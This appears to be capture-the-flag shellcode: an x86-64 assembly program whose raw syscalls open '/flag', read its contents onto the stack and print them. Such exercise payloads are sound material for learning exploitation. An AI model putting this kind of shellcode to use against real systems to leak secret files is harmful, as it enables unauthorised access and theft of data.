.section ".text"
.code64
.global _start
_start:
  # open("/flag", 0)
  mov $2, %eax
  lea flag_path(%rip), %rdi
  xor %esi, %esi
  syscall

  # read(fd, rsp, 0xff)
  mov %eax, %edi
  xor %eax, %eax
  mov $0xff, %edx
  mov %rsp, %rsi
  syscall

  # write(1, rsp, n)
  mov %eax, %edx
  mov $1, %eax
  mov $1, %edi
  syscall

  # exit(0)
  mov $60, %eax
  xor %edi, %edi
  syscall

flag_path:
  .ascii "/flag\0"
